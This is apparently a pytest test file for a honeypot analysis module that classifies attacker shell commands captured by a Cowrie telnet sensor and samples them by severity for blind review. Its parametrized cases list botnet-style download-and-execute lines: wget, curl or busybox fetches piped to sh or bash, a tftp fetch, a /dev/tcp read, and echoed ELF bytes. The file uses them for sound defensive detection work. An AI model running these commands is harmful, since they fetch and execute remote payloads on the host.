"""La muestra de la revisión a ciegas, sin Elasticsearch."""

from __future__ import annotations

from typing import Any

import pytest

from honeyml.medicion import muestra


@pytest.mark.parametrize(
    "comando",
    [
        "cd /tmp; wget http://198.51.100.4/x.sh; chmod +x x.sh; ./x.sh",
        "busybox wget 198.51.100.4/bins.sh -O- | sh",
        "curl -s -L ejemplo.test/a.sh | bash",
        "tftp -g -r mips 198.51.100.4",
        "echo -ne '\\x7f\\x45\\x4c\\x46' >> .s",
        "cat < /dev/tcp/198.51.100.4/80 > x",
        "echo ZWNobw== | base64 -d > /tmp/a",
    ],
)
def test_lo_que_transfiere_un_archivo(comando: str) -> None:
    assert muestra.transfiere(comando)


@pytest.mark.parametrize(
    "comando",
    [
        "uname -s -v -n -r -m",
        "wget --version",
        "which curl; curl --help",
        "chmod +x x.sh; ./x.sh",
        # la prueba de entorno de las botnets: imprime bytes, no escribe nada
        "echo -e '\\x41\\x4b\\x34\\x37'",
        "echo ZWNobw== | base64 -d | sh",
    ],
)
def test_lo_que_no_transfiere(comando: str) -> None:
    assert not muestra.transfiere(comando)


def _decision(
    momento: str, severidad: str, piso: str = "alto", copiada: bool = False
) -> dict[str, Any]:
    return {
        "@timestamp": momento,
        "evento": {
            "sensor": "cowrie",
            "categoria": "process",
            "accion": "command-input",
            "resultado": "",
            "protocolo": "telnet",
        },
        "decision": {"piso": piso, "severidad": severidad},
        "ciclo": {"reutilizada_de": "otra" if copiada else None},
    }


def _comando(texto: str) -> dict[str, Any]:
    return {"user": {"name": "root"}, "process": {"command_line": texto}}


def test_los_trozos_de_un_cargador_son_una_sola_conducta() -> None:
    decisiones = [
        ("t1", _decision("2026-09-16T10:00:00Z", "alto")),
        ("t2", _decision("2026-09-16T10:00:01Z", "critico")),
        ("t3", _decision("2026-09-17T09:00:00Z", "alto", copiada=True)),
    ]
    telemetria = {
        "t1": _comando("echo -ne '\\x7f\\x45' >> .s"),
        "t2": _comando("echo -ne '\\x01\\x02\\x03' >> .s"),
        "t3": _comando("echo -ne '\\xff' >> .s"),
    }

    [conducta] = muestra.agrupar(decisiones, telemetria).values()

    assert conducta.decisiones == 3
    assert conducta.transfiere
    # el representante es la razonada más reciente, no la copia que llegó después
    assert conducta.representante == "t2"
    assert conducta.estrato == "escalada_con_transferencia"


def test_el_comando_sale_saneado_como_lo_ve_el_motor() -> None:
    decisiones = [("a", _decision("t", "alto")), ("b", _decision("t", "alto"))]
    telemetria = {"a": _comando("CMD: uname -a"), "b": _comando("uname -a")}

    assert len(muestra.agrupar(decisiones, telemetria)) == 1


def test_sin_piso_alto_no_hay_estrato() -> None:
    c = muestra.Conducta(firma="f", piso="medio", transfiere=False, severidad="medio")
    assert c.estrato is None


def _conductas(estrato: str, cuantas: int) -> list[muestra.Conducta]:
    escalada = estrato.startswith("escalada")
    con = "con_" in estrato
    return [
        muestra.Conducta(
            firma=f"{estrato}-{i}",
            piso="alto",
            transfiere=con,
            representante=f"{estrato}-doc-{i}",
            severidad="critico" if escalada else "alto",
            decisiones=2,
        )
        for i in range(cuantas)
    ]


def test_cada_estrato_entra_hasta_el_tope_y_los_chicos_enteros() -> None:
    conductas = (
        _conductas("escalada_con_transferencia", 80)
        + _conductas("escalada_sin_transferencia", 7)
        + _conductas("alto_con_transferencia", 12)
        + _conductas("alto_sin_transferencia", 300)
    )

    m = muestra.elegir(conductas, por_estrato=50, semilla=1)

    assert {e: r["en_la_muestra"] for e, r in m["estratos"].items()} == {
        "escalada_con_transferencia": 50,
        "escalada_sin_transferencia": 7,
        "alto_con_transferencia": 12,
        "alto_sin_transferencia": 50,
    }
    assert m["estratos"]["alto_sin_transferencia"]["decisiones"] == 600
    assert len(m["conductas"]) == 119
    assert len({c["doc_id"] for c in m["conductas"]}) == 119


def test_la_misma_semilla_da_la_misma_muestra_y_mezclada() -> None:
    conductas = _conductas("escalada_con_transferencia", 30) + _conductas(
        "alto_sin_transferencia", 30
    )

    una = muestra.elegir(conductas, por_estrato=20, semilla=7)
    otra = muestra.elegir(conductas, por_estrato=20, semilla=7)

    assert una == otra
    # mezclada: los estratos no vienen en bloque
    primeros = [c["estrato"] for c in una["conductas"][:20]]
    assert len(set(primeros)) == 2
